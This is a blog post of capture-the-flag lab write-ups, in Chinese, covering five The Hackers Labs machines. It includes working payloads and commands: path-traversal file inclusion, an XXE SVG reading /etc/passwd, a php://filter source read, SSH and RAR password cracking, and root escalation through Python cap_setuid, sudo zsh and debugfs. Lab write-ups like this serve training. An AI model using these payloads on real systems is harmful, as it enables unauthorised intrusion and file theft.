---
layout: post
title: the hackers labs notes
date: 2025-10-12 14:16 +0800
categories: 
  - permeation
tags: 
  - the hackers labs
image: /assets/img/backgrounds/thehackerslabs.png
---


> From now , I'm diving into stuff that actually fires me up - no more "shoulds," just pure curiosity.

## Tortuga

> **提示:** 靶机跳转传送门
[Tortuga](https://labs.thehackerslabs.com/machines/131)

<img src="/assets/img/thehackerslabs-notes/20251012150814_008.webp" alt="Tortugs" style="zoom:50%;" />

### 信息搜集

![img](/assets/img/thehackerslabs-notes/20251012150813_000.webp)

扫端口，发现22和80，简单访问下80端口

下面两个php文件，dirsearch爆破过其他路径，也失败了，接下来就看看能不能走参数

翻译了下这个`mapa.php`路由，感觉上是让我找文件，然后就爆破参数名的时候，不能把目标文件写我们测试的`mapa.php`，目前来看，`index.html`，`tripulacion.php`文件都可以

![img](/assets/img/thehackerslabs-notes/20251012150813_001.webp)

用burp爆破攻击就好了，发现参数名就是filename

![img](/assets/img/thehackerslabs-notes/20251012150813_002.webp)

look here,这是`http://10.161.253.201/mapa.php?filename=tripulacion.php`的结果，两个文件都显示出来了
> **警告:** 不能执行filename=mapa.php的原因是这会导致php无限递归包含，最后达到memory_limit后触发HTTP 500 Internal Server Error给我们，对我来说这个解释应该是没问题了


![img](/assets/img/thehackerslabs-notes/20251012150813_003.webp)

然后我们尝试/etc/passwd,可惜失败了，但是发现双写后就没有问题，可以进行路径穿越

![img](/assets/img/thehackerslabs-notes/20251012150813_004.webp)

但是只能本地进行路径穿越，我也拿不到shell，回到那个mapa.php，会发现他们加粗了用户名grumete，正好这个也是/etc/passwd上面出现的用户，接下来需要考虑ssh弱密码爆破了

![img](/assets/img/thehackerslabs-notes/20251012150813_005.webp)

成功爆破出来，拿到了userflag

读取那个.nota.txt，拿到了capitan的登录密码`mar_de_fuego123`（实质上这一步可以不用

暂时回到web服务，我看看，确认了，我前面的操作都没问题

![img](/assets/img/thehackerslabs-notes/20251012150813_006.webp)

### 提权

然后想办法提权root

通过linepeas，掌握了新的技能

![img](/assets/img/thehackerslabs-notes/20251012150814_007.webp)

```bash
capitan@TheHackersLabs-Tortuga:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep
capitan@TheHackersLabs-Tortuga:~$ 
```

这里的`cap_setuid`能力集相较平时提权用的`suid`更厉害， 就是说它能分配`setuid(),setgid(),setresuid()`等特殊权限功能

```bash
capitan@TheHackersLabs-Tortuga:~$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Tortuga:~# cat /root/root.txt
c???????????????????????????ae
```

## ZAPP
> **提示:** 靶机跳转传送门
[ZAPP](https://labs.thehackerslabs.com/machines/143)

<img src="/assets/img/thehackerslabs-notes/zapp.png" alt="ZAPP" style="zoom:50%;" />

### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.167.222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-02 22:11 CST
Nmap scan report for 10.161.167.222
Host is up (0.81s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
```

先分析下ftp协议

```bash
(base) yolo@yolo:~$ ftp 10.161.167.222
Connected to 10.161.167.222.
220 Welcome zappskred.
Name (10.161.167.222:yolo): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
Commands may be abbreviated.  Commands are:

!               delete          hash            mlsd            pdir            remopts         struct
$               dir             help            mlst            pls             rename          sunique
account         disconnect      idle            mode            pmlsd           reset           system
append          edit            image           modtime         preserve        restart         tenex
ascii           epsv            lcd             more            progress        rhelp           throttle
bell            epsv4           less            mput            prompt          rmdir           trace
binary          epsv6           lpage           mreget          proxy           rstatus         type
bye             exit            lpwd            msend           put             runique         umask
case            features        ls              newer           pwd             send            unset
cd              fget            macdef          nlist           quit            sendport        usage
cdup            form            mdelete         nmap            quote           set             user
chmod           ftp             mdir            ntrans          rate            site            verbose
close           gate            mget            open            rcvbuf          size            xferbuf
cr              get             mkdir           page            recv            sndbuf          ?
debug           glob            mls             passive         reget           status
ftp> ls
229 Entering Extended Passive Mode (|||58817|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              28 Oct 29 20:59 login.txt
-rw-r--r--    1 0        0              65 Oct 29 21:23 secret.txt
226 Directory send OK.
ftp> get login.txt
local: login.txt remote: login.txt
229 Entering Extended Passive Mode (|||6845|)
150 Opening BINARY mode data connection for login.txt (28 bytes).
100% |*******************************************************************|    28        5.08 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (3.04 KiB/s)
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||51043|)
150 Opening BINARY mode data connection for secret.txt (65 bytes).
100% |*******************************************************************|    65        9.05 KiB/s    00:00 ETA
226 Transfer complete.
65 bytes received in 00:00 (6.08 KiB/s)
ftp> bye
221 Goodbye.
(base) yolo@yolo:~$ ls
8c5852e6-56fe-4474-9fc7-70123454c347.gif  key      login.txt   nfspy_mount  pattern.txt  secret.txt  test1
Desktop                                   key.pub  miniforge3  ntfs.db      reports      snap        test2
(base) yolo@yolo:~$ cat login.txt
puerto
4444
coffee
GoodLuck
(base) yolo@yolo:~$ cat secret.txt
0jO cOn 31 c4fe 813n p23p424dO, 4 v3c35 14 pista 357a 3n 14 7424
```

匿名用户拿到两个文件，发现secret.txt是leet语言，解密说是小心烫的咖啡，没搞懂，接下来看看http呢？

审计源码，拿到了

```html
<div style="display:none">4444 VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=</div>
```

进行4次base64解码，拿到了串字符，不晓得是什么，多次尝试，发现是一个路由

<img src="/assets/img/thehackerslabs-notes/image-20251102223447740.png" alt="image-20251102223447740" style="zoom:50%;" />

拿到了一个压缩包

<img src="/assets/img/thehackerslabs-notes/image-20251102223522660.png" alt="image-20251102223522660" style="zoom:50%;" />

怎么能是压缩的呢，不晓得密码是啥

### get flag

> 下面是参考老大的视频学习的：【thehackerlabs ZAPP靶机复盘-哔哩哔哩】 https://b23.tv/MdQIjKw

这里需要用rockyou进行爆破

```bash
~$ wget http://10.161.167.222/cuatrocuatroveces/Sup3rP4ss.rar
~$ rar2john Sup3rP4ss.rar > tmp
~$ john tmp --wordlist=/snap/seclists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 32 OpenMP threads
Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
reema            (Sup3rP4ss.rar)
1g 0:00:00:19 DONE (2025-11-02 23:22) 0.05056g/s 4296p/s 4296c/s 4296C/s tracymcgrady..llandudno
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

拿到了压缩包密码

```bash
(base) yolo@yolo:~/Desktop/timu$ unrar x Sup3rP4ss.rar

UNRAR 7.00 freeware      Copyright (c) 1993-2024 Alexander Roshal


Extracting from Sup3rP4ss.rar

Enter password (will not be echoed) for Sup3rP4ss.txt:

Extracting  Sup3rP4ss.txt                                             OK
All OK
(base) yolo@yolo:~/Desktop/timu$ cat Sup3rP4ss.txt
Intenta probar con más >> 3spuM4 
```

哈哈，这里真难绷，都能硬控老大10多分钟，3spuM4是一个用户的密码，但是我们不晓得用户名，老大已经帮我测试了好多好多，最后发现是这里的`zappskred`

![image-20251102232650887](/assets/img/thehackerslabs-notes/image-20251102232650887.png)

这里的用户名我们前面见过一次的，是主机名

<img src="/assets/img/thehackerslabs-notes/image-20251102232807152.png" alt="image-20251102232807152" style="zoom:50%;" />

直接ssh远程登上去，拿到user.txt，接下来查看.bash_history，其实已经能知道rootflag是啥了，也能看得出来，这里出题人打算用sudoers出，直接拿root

```bash
zappskred@TheHackersLabs-ZAPP:~$ ls
user.txt
zappskred@TheHackersLabs-ZAPP:~$ cat user.txt
ZWwgbWVqb3?????????=
zappskred@TheHackersLabs-ZAPP:~$ cat .bash_history
ftp
sudo apt install ftp
sudo apt install vsftpd -y
sudo su
su
clear
sudo apt install vsftpd -y
ftpdç
ftpd
cd /etc/
ls
ip a
cls
clear
ip a
sudo dhclient
clear
ip a
sudo reboot now
cat /etc/sudoers
sudo cat /etc/sudoers
sudo su
sudo root
exit
clear
ifconfig
ip a
ssh-keygen -f '/home/kali/.ssh' -R '192.168.1.34'
ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
sudo ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
exit
clear
ls
clear
exit
clear
passwd
exit
clear
ls
cat
clear
sudo apt install zsh
exit
clear
whoami
sudo -l
clear
sudo zsh
sudo su
sudo root
exit
ls
sudo -l
sudo zsh
clear
echo "exitosocafe" | base64
exit
ls
ls -lash
cp user.txt user.txt
mv user.txt user.txt
rm user.txt
ls
clear
echo "el mejor cafe" | base64 > user.txt
ls
cd ..
system
apt install apache2
exit
clear
sudo zsh
clear
nano ~/.bashrc
cat /etc/issue
exit
sudo zsh
clear
sudo zsh
clear
sudo zsh
exit
echo '    ███████╗ █████╗ ██████╗ ██████╗
 ╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
   ███╔╝ ███████║██████╔╝██████╔╝
  ███╔╝  ██╔══██║██╔═══╝ ██╔═══╝
 ███████╗██║  ██║██║     ██║
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝

' | sudo tee /etc/issue.net > /dev/null
clear
sudo zsh
exit
sudo zsh
exit
zappskred@TheHackersLabs-ZAPP:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
[sudo] password for zappskred:
Sorry, try again.
[sudo] password for zappskred:
Matching Defaults entries for zappskred on TheHackersLabs-ZAPP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zappskred may run the following commands on TheHackersLabs-ZAPP:
    (root) /bin/zsh
zappskred@TheHackersLabs-ZAPP:~$ sudo /bin/zsh
sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
TheHackersLabs-ZAPP# cat ~/root.txt
c2llbXByZSBlcyBudWV???????==
TheHackersLabs-ZAPP#
```

## Photographer

> **提示:** 靶机跳转传送门
[Photographer](https://labs.thehackerslabs.com/machines/142)

<img src="/assets/img/thehackerslabs-notes/photographer.png" alt="Photographer" style="zoom:50%;" />

### 信息搜集

IP 10.161.208.161

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.208.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:03 CST
Nmap scan report for 10.161.208.161
Host is up (0.0053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
```

就两个端口，直接看web

dirsearch扫描过，发现了admin登录界面，但是账号密码都不清楚，尝试过sql注入，也失效，不喜欢爆破密码，再说同时爆破两处几乎不怎么会成功，接下来去研究有没有其他端口开放，比如说udp和tcp端口

```bash
(base) yolo@yolo:~$ sudo nmap -sU -p 53,67,68,69,123,135,137,138,139,161,162,445,514,631,1434 10.161.208.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:42 CST
Nmap scan report for 10.161.208.161
Host is up (0.0026s latency).

PORT     STATE         SERVICE
53/udp   closed        domain
67/udp   closed        dhcps
68/udp   open|filtered dhcpc
69/udp   closed        tftp
123/udp  closed        ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  closed        netbios-dgm
139/udp  closed        netbios-ssn
161/udp  open          snmp
162/udp  closed        snmptrap
445/udp  closed        microsoft-ds
514/udp  closed        syslog
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
```

发现这里的snmp端口开放，相关介绍可以拜读下面的宝藏笔记

宝藏网站笔记https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html

```bash
(base) yolo@yolo:~$ snmpwalk -v 2c -c public 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull = No more variables left in this MIB View (It is past the end of the MIB tree)
(base) yolo@yolo:~$ snmpwalk -v 2c -c security 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."mycreds" = STRING: ethan:1N3qVgwNB6cZmNSyr8iX$!
```

会发现这里，SNMP的只读社区字符串读取不到信息，只能在特权社区中去读取，应该是拿到了网站的账密，理由是ethan刚好在主页见过

<img src="/assets/img/thehackerslabs-notes/image-20251105215034702.png" alt="image-20251105215034702" style="zoom:50%;" />

### get shell

成功登录进来了

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css?v=1">
    <title>Admin</title>
</head>
<body>
	<div class="log-form">
		<h2>Subir Fotografía</h2>
	  	<form method="POST" action="upload.php" enctype="multipart/form-data">
			<input type="file" name="file" accept=".jpg,.png,.gif,.jpeg">
	    		<button type="submit" class="btn">Subir</button>
	  	</form>
	</div>

	<a href="/admin/logout.php" style="background: #b00020; color: #fff; text-decoration: none; padding: .5rem; margin-top: 1rem; display: inline-block;" >Cerrar sesión</a>
	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
</body>
</html>

```

发现是个文件上传，而且呢，~~这里只有前端限制，完全可以抓包再发~~

图片上传失败了，因为我发现上传的图片会自动打开，然后观察到这里用img标签解析，那么也许可以尝试下svg

<img src="/assets/img/thehackerslabs-notes/image-20251105221154546.png" alt="image-20251105221154546" style="zoom:50%;" />

look here

<img src="/assets/img/thehackerslabs-notes/image-20251105221030326.png" alt="image-20251105221030326" style="zoom:50%;" />

然后我研究了下，尝试的payload如下，可以读任意文件

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="20">&xxe;</text>
</svg>

```

先拿下upload.php，很疑惑，为啥能传svg文件

<img src="/assets/img/thehackerslabs-notes/image-20251105222247800.png" alt="image-20251105222247800" style="zoom:50%;" />

```php
<?php

function displayHTMLImage($imageFile)
{
    $type = mime_content_type($imageFile);

    switch ($type) {
        case 'image/jpg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/jpeg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpeg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/png':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/png;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/gif':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/gif;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/svg+xml'://关注这里，启用外部实体加载，会直接输出svg内容
            libxml_disable_entity_loader(false);
	    $doc = new DOMDocument();
            $doc->loadXML(file_get_contents($imageFile), LIBXML_NOENT | LIBXML_DTDLOAD);
	    $svg = $doc->getElementsByTagName('svg');
            echo $svg->item(0)->C14N();
            break;
        default:
            echo "Tipo de imagen no reconocida.";
    }
}

$target_dir = "./ethan_photographs/";

$fileName = date('ymd') . '_' . basename($_FILES["file"]["name"]);
$target_file = $target_dir . $fileName;


$contentType = $_FILES['file']['type'];
$MIMEtype = mime_content_type($_FILES['file']['tmp_name']);


if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "ExtensiÃ³n no permitida.";
    die();
}

if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Solo se permiten imagenes.";
    die();
}
//look here，发现后缀名仅仅看最后一个字母，恰好svg也是g结尾
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Solo se permiten imagenes.";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "Archivo demasiado grande.";
    die();
}

if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "Ocurrio un error al subir el archivo.";
}
```

接下来关注下db.php，看有没有信息泄露

```php
<?php
$host = "localhost";
$db = "blog";
$user = "root";
$pass = "pjtF0533OPiSMQTGZacZY6jy$";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

```

拿到一个密码，应该就是服务器内部某个用户密码吧，看过/etc/passwd了，存在一个ethan

```bash
(base) yolo@yolo:~$ ssh ethan@10.161.208.161
The authenticity of host '10.161.208.161 (10.161.208.161)' can't be established.
ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.161.208.161' (ED25519) to the list of known hosts.
ethan@10.161.208.161's password:
Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer

Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
ethan@photographer:~$ ls
creds.txt  user.txt
```

这里的提权是通过disk用户组

```bash
ethan@photographer:~$ id
uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
```

网上找了个[教程](https://blog.csdn.net/2301_79518550/article/details/145452956)，使用/usr/sbin/debugfs成功读取root.txt

```bash
ethan@photographer:~$ ls -la /dev/sd*
brw-rw---- 1 root disk 8, 0 nov  5 14:00 /dev/sda
brw-rw---- 1 root disk 8, 1 nov  5 14:00 /dev/sda1
brw-rw---- 1 root disk 8, 2 nov  5 14:00 /dev/sda2
brw-rw---- 1 root disk 8, 5 nov  5 14:00 /dev/sda5
ethan@photographer:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  ls
debugfs:  cd /root
debugfs:  ls
debugfs:  cat root.txt
dc54639c5bd88637cc23dd7???????bf
debugfs:
```

## THLPWN
> **提示:** 靶机跳转传送门
[THLPWN](https://labs.thehackerslabs.com/machines/141)

<img src="/assets/img/thehackerslabs-notes/thlpwn.png" alt="THLPWN" style="zoom:50%;" />


### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.144.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 12:20 CST
Nmap scan report for 10.161.144.56
Host is up (0.86s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

扫描完常见端口，发现就两个开放，访问网页，发现需要指定hostname,然后这里注释了一个信息，应该就是了

```bash
curl -H "Host: thlpwn.thl" http://10.161.144.56
```

<img src="/assets/img/thehackerslabs-notes/image-20251109122631937.png" alt="image-20251109122631937" style="zoom:50%;" />

浏览器中的话，那就用hackbar插件弄

<img src="/assets/img/thehackerslabs-notes/image-20251109122857258.png" alt="image-20251109122857258" style="zoom:50%;" />

嘶，总感觉这题我好像有点非预期

### solve

在download下面下载了个二进制文件，逆向分析下，直接拿到用户账密

<img src="/assets/img/thehackerslabs-notes/image-20251109124045480.png" alt="image-20251109124045480" style="zoom:50%;" />

然后呢就进去拿到flag，至于root的话，这里直接是无密码sudo权限

<img src="/assets/img/thehackerslabs-notes/image-20251109124234097.png" alt="image-20251109124234097" style="zoom:50%;" />

## LavaShop
> **提示:** 靶机跳转传送门
[LavaShop](https://labs.thehackerslabs.com/machines/140)

<img src="/assets/img/thehackerslabs-notes/LavaShop.png" alt="LavaShop" style="zoom:50%;" />

### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.145.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 13:17 CST
Nmap scan report for 10.161.145.95
Host is up (0.73s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
```

扫描常见端口，看上去只有80端口能用

看上去需要先手动改hosts

```bash
(base) yolo@yolo:~$ curl http://10.161.145.95
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://lavashop.thl/">here</a>.</p>
<hr>
<address>Apache/2.4.62 (Debian) Server at 10.161.145.95 Port 80</address>
</body></html>
(base) yolo@yolo:~$ sudo nano /etc/hosts
(base) yolo@yolo:~$ curl http://10.161.145.95
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://lavashop.thl/">here</a>.</p>
<hr>
<address>Apache/2.4.62 (Debian) Server at 10.161.145.95 Port 80</address>
</body></html>
(base) yolo@yolo:~$ curl http://lavashop.thl
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>LavaShop</title>
  <link rel="stylesheet" href="/assets/css/styles.css?v=1">
</head>
<body>

<header class="site-header">
  <div class="site-header__inner">
    <!-- Logo -->
    <a href="/index.php" class="site-logo">
      <span class="site-logo__icon"></span>
      <span class="site-logo__text">LavaShop</span>
    </a>

    <!-- Menú -->
    <nav class="site-nav" aria-label="Principal">
  <ul class="site-nav__list">
    <li><a class="site-nav__link" href="/index.php?page=home">Inicio</a></li>
    <li><a class="site-nav__link" href="/index.php?page=products">Productos</a></li>
    <li><a class="site-nav__link" href="/index.php?page=about">Sobre Nosotros</a></li>
    <li><a class="site-nav__link" href="/index.php?page=contact">Contacto</a></li>
  </ul>
</nav>
  </div>
</header>

    <section class="hero" style="padding: 3rem 0; text-align:center;">
      <h2>Bienvenido a LavaLamps Shop</h2>
      <p>Las mejores lámparas de lava para diseñar tu espacio.</p>
      <p style="margin-top:1rem;">
        <a class="cta" href="/index.php?page=products" style="display:inline-block;background:#ff445a;color:#fff;padding:.75rem 1.1rem;border-radius:10px;text-decoration:none;font-weight:700;">
          Ver catálogo
        </a>
      </p>
    </section>
    <footer>
  <p>&copy; 2025 Lava Lamps Shop - Todos los derechos reservados.</p>
</footer>
</body>
</html>
</body></html>
```

然后扫描两次路径，找到一些php，可以考虑爆破参数名了

```bash
(base) yolo@yolo:~$ dirsearch -u http://lavashop.thl/
/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/yolo/reports/http_lavashop.thl/__25-11-09_13-24-41.txt

Target: http://lavashop.thl/

[13:24:41] Starting:
[13:24:42] 403 -  277B  - /.ht_wsr.txt
[13:24:42] 403 -  277B  - /.htaccess.bak1
[13:24:42] 403 -  277B  - /.htaccess.orig
[13:24:42] 403 -  277B  - /.htaccess.sample
[13:24:42] 403 -  277B  - /.htaccess.save
[13:24:42] 403 -  277B  - /.htaccess_extra
[13:24:42] 403 -  277B  - /.htaccess_orig
[13:24:42] 403 -  277B  - /.htaccess_sc
[13:24:42] 403 -  277B  - /.htaccessOLD
[13:24:42] 403 -  277B  - /.htaccessBAK
[13:24:42] 403 -  277B  - /.htaccessOLD2
[13:24:42] 403 -  277B  - /.htm
[13:24:42] 403 -  277B  - /.html
[13:24:42] 403 -  277B  - /.htpasswd_test
[13:24:42] 403 -  277B  - /.htpasswds
[13:24:42] 403 -  277B  - /.httr-oauth
[13:24:42] 403 -  277B  - /.php
[13:24:49] 403 -  277B  - /assets/
[13:24:49] 301 -  313B  - /assets  ->  http://lavashop.thl/assets/
[13:24:54] 301 -  315B  - /includes  ->  http://lavashop.thl/includes/
[13:24:54] 403 -  277B  - /includes/
[13:24:57] 301 -  312B  - /pages  ->  http://lavashop.thl/pages/
[13:24:57] 403 -  277B  - /pages/
[13:25:00] 403 -  277B  - /server-status/
[13:25:00] 403 -  277B  - /server-status

Task Completed
(base) yolo@yolo:~$ dirsearch -u http://lavashop.thl/pages/
/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/yolo/reports/http_lavashop.thl/_pages__25-11-09_13-35-15.txt

Target: http://lavashop.thl/

[13:35:15] Starting: pages/
[13:35:17] 200 -  179B  - /pages/about.php
[13:35:22] 200 -  119B  - /pages/contact.php
[13:35:25] 200 -  169B  - /pages/home.php
[13:35:30] 200 -  352B  - /pages/products.php

Task Completed
```

看上去products.php内容多一些，那么的话，看看能爆破出来任意读取文件的参数吗，盲猜一波，是file

```bash
(base) yolo@yolo:~$ wfuzz -w /snap/seclists/1214/Discovery/Web-Content/common.txt -u http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd --hh 1002
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd
Total requests: 4750

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001798:   200        54 L     145 W      2466 Ch     "file"

Total time: 3.059159
Processed Requests: 4750
Filtered Requests: 4749
Requests/sec.: 1552.714
```

猜对咯

然后我们读取一下products.php的内容

```bash
curl "http://lavashop.thl/pages/products.php?file=php://filter/convert.base64-encode/resource=products.php"
```

很明显的文件包含

<img src="/assets/img/thehackerslabs-notes/image-20251109143519816.png" alt="image-20251109143519816" style="zoom:50%;" />


